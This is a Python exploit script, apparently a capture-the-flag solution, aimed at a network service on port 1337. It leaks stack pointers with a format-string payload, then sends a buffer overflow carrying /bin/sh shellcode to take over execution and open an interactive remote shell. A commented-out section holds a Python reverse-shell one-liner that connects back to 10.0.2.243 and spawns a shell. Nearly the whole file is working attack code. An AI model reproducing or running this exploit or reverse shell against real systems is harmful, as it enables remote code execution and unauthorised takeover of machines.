#!/usr/bin/env python3
import socket
import select
import time
import struct

HOST = "cloud-c2-70"
PORT = 1337
REVERSE_IP = "10.0.2.243"
REVERSE_PORT = 1337
BUFFER_SIZE = 128
GET_PTR_PAYLOAD = b"%p-" * 8
# Gives shell
SHELLCODE = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


def get_pointers(data):
    r = data.split(b"-")
    return {"frame": int(r[3], 0), "buffer": int(r[5], 0)}  # FP  # BP


def generate_payload(pointers):
    print("[*] Shellcode size:", len(SHELLCODE))
    payload = SHELLCODE
    payload += b"A" * (BUFFER_SIZE - len(SHELLCODE))
    payload += struct.pack("<q", pointers["frame"])
    payload += struct.pack("<q", pointers["buffer"])
    print("[*] Payload size:", len(payload))
    print("[*] Payload:", payload)
    return payload


# def generate_reverse_shell():
# return b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(REVERSE_IP, REVERSE_PORT)
# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#    s.connect((HOST, PORT))
#    data = s.recv(1024)
#    s.sendall(GET_PTR_PAYLOAD + b'\r\n')
#    data = s.recv(1024)
#    pointers = get_pointers(data)
#    print("[*] Frame pointer at:", hex(pointers["frame"]))
#    print("[*] Buffer pointer at:", hex(pointers["buffer"]))
#    payload = generate_payload(pointers)
#    s.sendall(payload + b"\r\n")
#    #s.sendall(generate_reverse_shell() + b"\n")
#    while True:
#        s.setblocking(0)
#        cmd = input(">")
#        s.sendall(cmd.encode() + b'\n')
#        ready = select.select([s], [], [], 1)
#        if ready[0]:
#            data = s.recv(4096)
#            print(data)
import sys, tty

# tty.setcbreak(sys.stdin.fileno())
import asyncio
import os
import sys

loop = asyncio.get_event_loop()


async def echo(reader):
    while True:
        data = await reader.read(100)
        print(data.decode("utf-8", "backslashreplace"), end="", flush=True)
        # print(data, flush=True)


async def stdio(limit=asyncio.streams._DEFAULT_LIMIT, loop=None):
    if loop is None:
        loop = asyncio.get_event_loop()
    reader = asyncio.StreamReader(limit=limit, loop=loop)
    await loop.connect_read_pipe(
        lambda: asyncio.StreamReaderProtocol(reader, loop=loop), sys.stdin
    )
    return reader


async def tcp_echo_client():
    reader, writer = await asyncio.open_connection(HOST, PORT)
    data = await reader.read(1024)
    writer.write(GET_PTR_PAYLOAD + b"\r\n")
    await writer.drain()
    data = await reader.read(1024)
    pointers = get_pointers(data)
    print("[*] Frame pointer at:", hex(pointers["frame"]))
    print("[*] Buffer pointer at:", hex(pointers["buffer"]))
    payload = generate_payload(pointers)
    writer.write(payload + b"\r\n")
    await writer.drain()
    loop.create_task(echo(reader))
    reader = asyncio.StreamReader(loop=loop)
    reader_protocol = asyncio.StreamReaderProtocol(reader)
    await loop.connect_read_pipe(lambda: reader_protocol, sys.stdin)
    while True:
        # print("$ ", end='', flush=True)
        # cmd = await reader.read(1)
        cmd = await reader.readline()
        # print(cmd.decode(), end='', flush=True)
        # print('read', cmd)
        writer.write(cmd)
        await writer.drain()


loop.create_task(tcp_echo_client())
loop.run_forever()

